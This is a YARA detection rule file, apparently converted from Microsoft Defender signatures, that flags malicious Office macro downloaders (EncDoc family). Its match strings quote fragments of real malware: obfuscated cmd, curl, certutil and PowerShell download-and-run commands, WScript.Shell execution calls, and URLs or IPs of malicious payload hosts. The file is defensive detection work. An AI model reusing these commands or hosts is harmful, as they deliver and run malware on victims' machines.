        detection_name = "TrojanDownloader:O97M/EncDoc.QVSM!MTB"
        threat_id = "2147830455"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "JqwALouR.Ykm" ascii //weight: 1
        $x_1_2 = "= Mid(s, pos + 1, 1)" ascii //weight: 1
        $x_1_3 = "= Mid(x, y + 1, 1)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_QUSM_2147830466_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.QUSM!MTB"
        threat_id = "2147830466"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 22 22 66 6f 72 6b 3d 30 74 6f 6c 65 6e 28 73 29 2d 31 73 68 69 66 74 3d 28 61 73 63 28 6d 69 64 28 6b 65 79 2c 28 6b 6d 6f 64 6c 65 6e 28 6b 65 79 29 29 2b 31 2c 31 29 29 6d 6f 64 6c 65 6e 28 73 29 29 2b 31 [0-31] 3d 00 26 6d 69 64 28 73 2c 73 68 69 66 74 2c 31 29 73 3d [0-31] 28 73 2c 73 68 69 66 74 29 6e 65 78 74 6b 65 6e 64 66 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_2 = "for=0to()-1step2=/2()=255-(&(,)&(,+1))next=endfunction" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_HYSM_2147831933_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.HYSM!MTB"
        threat_id = "2147831933"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "//54.249.210.44/xi/loader/uploads/MT-07610135.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_HZSM_2147832044_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.HZSM!MTB"
        threat_id = "2147832044"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "exe.ssres/moc.makcilctsuj//:ptth" ascii //weight: 1
        $x_1_2 = "\" + \"\" + \"\" + \"\" + \"\" + \"\" + \"\" + \"W\" + \"\" + \"\" + \"Sc\" + \"ri\" + \"\" + \"\" + \"\" + \"\" + \"pt\" + \".S\" + \"\" + \"\" + \"\" + \"\" + \"\" + \"he\" + \"l\" + \"\" + \"\" + \"l" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_STIW_2147832113_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.STIW!MTB"
        threat_id = "2147832113"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\CIMV2\")" ascii //weight: 1
        $x_1_2 = "objWMIService.ExecQuery(\"SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True\", , 48)" ascii //weight: 1
        $x_1_3 = "Sub HS86S0DEJ()" ascii //weight: 1
        $x_1_4 = "URL = \"http://word2022.c1.biz//index.php?\" & \"os=\" & OsVersion & \"&name=\" & GetHostName & \"&ip=\" & GetIp" ascii //weight: 1
        $x_1_5 = "Sub FDK346SSD()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_STIW_2147832113_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.STIW!MTB"
        threat_id = "2147832113"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "rockbottom = \"naakslookD5\"" ascii //weight: 1
        $x_1_2 = "GetObject(\"NeW\" & a1740u5hf & Right(rockbottom, 2) & \"-D70A-438B-8A42-984\" & CLng(1.9) & \"4B88AFB\" & CInt(8.2))" ascii //weight: 1
        $x_1_3 = "kqhh = chnjhx0q & \"lic\\156498415616651651984561561658456.exe\"" ascii //weight: 1
        $x_1_4 = "godknows = Replace(\"cmd /c pow^chnjhx0qrs^hchnjhx0qll/W 01 c^u^rl htt^p://ppaauuaa11232.cc/aaa.chnjhx0q^xchnjhx0q -o \" & kqhh & \";\" & kqhh, \"chnjhx0q\", \"e\")" ascii //weight: 1
        $x_1_5 = "nebbb = Replace(\"rundz_a_d_fz_a_d_f32 urz_a_d_f.dz_a_d_fz_a_d_f,OpenURL \" & igfvguzb96j, \"z_a_d_f\", \"l\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_BSMQ_2147832356_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.BSMQ!MTB"
        threat_id = "2147832356"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "45.155.165.63/tq/loader/uploads/Product_Details_018_RFQ.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PDL_2147832491_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PDL!MTB"
        threat_id = "2147832491"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "c^u^rlhtt^p://209.127.20.13/wokn3c4qdf9.j^s-o\"&g9vz&\";\"&g9vz,\"n3c4qdf9\",\"e\")" ascii //weight: 1
        $x_1_2 = "a_d_f,openurl\"&iuqqagnp8ow," ascii //weight: 1
        $x_1_3 = "=replace(\"@or@iles\",\"@\",\"f\")reco." ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SCC_2147832559_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SCC!MTB"
        threat_id = "2147832559"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CreateObject(ehpknhpjfyulcce(\"575363726970742e536865\") & ehpknhpjfyulcce(\"6c6c\")).Run cmdLine, 0" ascii //weight: 1
        $x_1_2 = ".setRequestHeader ehpknhpjfyulcce(\"557365722d416765\") & ehpknhpjfyulcce(\"6e74\"), ehpknhpjfyulcce(\"4d6f7a\") & ehpknhpjfyulcce(\"696c6c612f342e302028636f6d70617469626c653b204d53494520362e303b2057696e646f7773204e5420352e3029\")" ascii //weight: 1
        $x_1_3 = "= CreateObject(ehpknhpjfyulcce(\"41444f44422e\") & ehpknhpjfyulcce(\"53747265616d\"))" ascii //weight: 1
        $x_1_4 = ".Write hcstwdzulx.ResponseBody" ascii //weight: 1
        $x_1_5 = "fhoqmxyczsillwu.SaveToFile trpcdnytxc, 2" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SEE_2147832643_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SEE!MTB"
        threat_id = "2147832643"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_2 = "= CreateObject(\"Msxml2.DOMDocument.6.0\")" ascii //weight: 1
        $x_1_3 = ".LoadXML (LoadXML(\"<?kzy irefvba='1.0'?> <fglyrfurrg kzyaf=\"\"uggc://jjj.j3.bet/1999/KFY/Genafsbez\"\" kzyaf:zf=\"\"hea:fpurznf-zvpebfbsg-pbz:kfyg\"\" kzyaf:hfre=\"\"cynprubyqre\"\" irefvba=\"\"1.0\"\">" ascii //weight: 1
        $x_1_4 = "test.setProperty \"AllowXsltScript\", True" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SFF_2147832681_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SFF!MTB"
        threat_id = "2147832681"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= CreateObject(\"\" + \"\" + \"\" + \"\" + \"\" + \"\" + \"\" + \"W\" + \"\" + \"\" + \"Sc\" + \"ri\" + \"\" + \"\" + \"\" + \"\" + \"pt\" + \".S\" + \"\" + \"\" + \"\" + \"\" + \"\" + \"he\" + \"l\" + \"\" + \"\" + \"l\")" ascii //weight: 1
        $x_1_2 = "= \"%Temp%\" & \"\\\" + \"WinUpdate.exe\"" ascii //weight: 1
        $x_1_3 = ".Run \"certutil.exe -urlcache -split -f \" + ccuHyzsMgHk + \" \" + ZbLoWerl, 0, True" ascii //weight: 1
        $x_1_4 = "= Len(XxWr9) To 1 Step -1" ascii //weight: 1
        $x_1_5 = ".Run (ZbLoWerl)" ascii //weight: 1
        $x_1_6 = "Sub AutoOpen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SHH_2147832820_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SHH!MTB"
        threat_id = "2147832820"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sub AutoOpen()" ascii //weight: 1
        $x_1_2 = "= \"\"\"exe.89057002%REDRO/llxd/moc.makcilctsuj//:sptth\"\"\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PT_2147833730_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PT!MTB"
        threat_id = "2147833730"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CreateObject(\"Microsoft.XMLDOM\").CreateElement(\"b64\")" ascii //weight: 1
        $x_1_2 = "dataType = \"bin.base64\": .nodeTypedValue" ascii //weight: 1
        $x_1_3 = "CreateTextFile(Pathh & \"Script.ps1\", True)" ascii //weight: 1
        $x_1_4 = "C:\\Users\\\" & uName & \"\\AppData\\Local\\Microsoft\\Windows\\Update\\" ascii //weight: 1
        $x_1_5 = "FSO2.CreateTextFile(Pathh & \"Updater.vbs\", True)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_JPT_2147834033_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.JPT!MTB"
        threat_id = "2147834033"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://www.dropbox.com/s/zhp1b06imehwylq/Synaptics.rar?dl=1" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_JPM_2147835425_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.JPM!MTB"
        threat_id = "2147835425"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 31 39 32 2e 33 2e 31 39 34 2e 32 34 36 2f [0-31] 2e 65 78 65 22}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 65 78 65 2e 65 78 65 20 26 26 20 [0-47] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_DSM_2147836329_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.DSM!MTB"
        threat_id = "2147836329"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "YXY = \"YXY&%#Y\" + \"XY$w?\" + \"rsh?>> -<#YXY$YXY&% -?YXY&% ByYXY&%ass -c (\" + \"I\" + \"'\" + \"w\" + \"'\" + \"r\" + \"('" ascii //weight: 1
        $x_1_2 = "YXY = VBA.Replace(YXY, \"YXY&%\", \"p\")" ascii //weight: 1
        $x_1_3 = "YXY = VBA.Replace(YXY, \"#YXY$\", \"o\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SPP_2147840506_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SPP!MTB"
        threat_id = "2147840506"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Debug.Print deliziosamente(debugG(\"2ht40t1p11s4:6/12/b5bp0li78ne3.c4o0m4\"))" ascii //weight: 1
        $x_1_2 = "oXHTTP.Open \"get\", siu, False" ascii //weight: 1
        $x_1_3 = "oXHTTP.setRequestHeader \"etag\", \"fetch\"" ascii //weight: 1
        $x_1_4 = "= CreateObject(\"ADODB.Stream\")" ascii //weight: 1
        $x_1_5 = "debugG(\"15r24u5n5d3l1l18\") & oL" ascii //weight: 1
        $x_1_6 = "Environ$(\"USERPROFILE\") & \"\\Documents\" & _" ascii //weight: 1
        $x_1_7 = "Application.PathSeparator & _" ascii //weight: 1
        $x_1_8 = "gj & \".raw\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SYY_2147842163_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SYY!MTB"
        threat_id = "2147842163"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= CreateObject(\"MsXMl2.xMlhTTp\")" ascii //weight: 1
        $x_1_2 = "soleggiata.Open \"get\", afroamericana, 0" ascii //weight: 1
        $x_1_3 = "soleggiata.setRequestHeader procurano, \"fetch\"" ascii //weight: 1
        $x_1_4 = "VBA.Shell scatenano(minacciO) & Len(lascianeE) & \" ,InetCpl.Cpl, ClearMyTracksByProcess 11\", vbHide" ascii //weight: 1
        $x_1_5 = "= Environ$(\"USERPROFILE\")" ascii //weight: 1
        $x_1_6 = "= hoRo & \"\\Documents\" & _" ascii //weight: 1
        $x_1_7 = "MsgBox (Len(feldmaresciallo((disumana(\"11h1t1tp11s1:1/1/1ski1nyd1r1es1s.1c11om1\")))) - 406 + 2)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SZZ_2147842784_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SZZ!MTB"
        threat_id = "2147842784"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"windowsinstaller.installer\"" ascii //weight: 1
        $x_1_2 = "= CreateObject(FrOWKf)" ascii //weight: 1
        $x_1_3 = "bqXbj.InstallProduct \"http:/\" & \"/104.2\" & \"34.\" & \"118.\" & \"16\" & \"3/si\" & \".msi\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SB_2147843469_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SB!MTB"
        threat_id = "2147843469"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Split(strBytes)" ascii //weight: 1
        $x_1_2 = "= objFSO.CreateTextFile(Path & \"\\image003.zip\", True)" ascii //weight: 1
        $x_1_3 = "For iIter = LBound(aNumbers) To UBound(aNumbers)" ascii //weight: 1
        $x_1_4 = "sShellCode = sShellCode + Chr(aNumbers(iIter))" ascii //weight: 1
        $x_1_5 = "sShellCode = sShellCode + ParseBytes(\"60 33 68 79 67 84 89 80 69 32 104 116 109 108 62 10 60 104 116 109 108 62 10 60 104\")" ascii //weight: 1
        $x_1_6 = "sShellCode = sShellCode + ShellCode1()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RVR_2147849157_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RVR!MTB"
        threat_id = "2147849157"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "strreverse(activesheet.range(\"fk156\").value)" ascii //weight: 1
        $x_1_2 = "strreverse(brjkznwh+vvizgdkz)setlcrtdbp=getobject(replace(\"wish1tsh1ttynmgsh1tsh1ttymtsh1tsh1ttys:\\\\.\\rosh1tsh1ttyot" ascii //weight: 1
        $x_1_3 = "xsgboal.open\"get\",dvehkdj&\"windows\",false" ascii //weight: 1
        $x_1_4 = "document_open()yylpdlzendsub" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RVS_2147851418_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RVS!MTB"
        threat_id = "2147851418"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "we^bre*quest-u^ri\"\"http://lostheaven.com.cn/wp-includes/id3/doc_1086_036pdf.exe\"\"-out*file$tempfile;" ascii //weight: 1
        $x_1_2 = "replace(iskte,\"^\",\"\")seticfyi=createobject(\"wscript.shell\")seticfyiexec=icfyi.exec(iskte)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SBS_2147899439_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SBS!MTB"
        threat_id = "2147899439"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= CreateObject(\"Microsoft.XMLHTTP\")" ascii //weight: 1
        $x_1_2 = "= CreateObject(\"Adodb.Stream\")" ascii //weight: 1
        $x_1_3 = {2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 22 68 74 74 70 [0-90] 2e 65 78 65 22 2c}  //weight: 1, accuracy: Low
        $x_1_4 = {53 68 65 6c 6c 20 28 22 [0-47] 2e 65 78 65 22 29}  //weight: 1, accuracy: Low
        $x_1_5 = {2e 73 61 76 65 74 6f 66 69 6c 65 20 22 [0-47] 2e 65 78 65 22 2c 20 32 20 27}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PVAA_2147914044_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PVAA!MTB"
        threat_id = "2147914044"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "subautoopen()" ascii //weight: 1
        $x_1_2 = "auto_openendsubsubworkbook_open()" ascii //weight: 1
        $x_1_3 = "dimcmdasstringcmd" ascii //weight: 1
        $x_1_4 = "=\"powershell-nop-whidden-c\"\"$k=new-objectnet.webclient;$k.proxy=[net.webrequest]::getsystemwebproxy();$k.proxy.credentials=[net.credentialcache]::defaultcredentials;iex$k.downloadstring('http://<your_attacker_ip>:<port>/payload')\"" ascii //weight: 1
        $x_1_5 = "createobject(\"wscript.shell\").runcmd" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

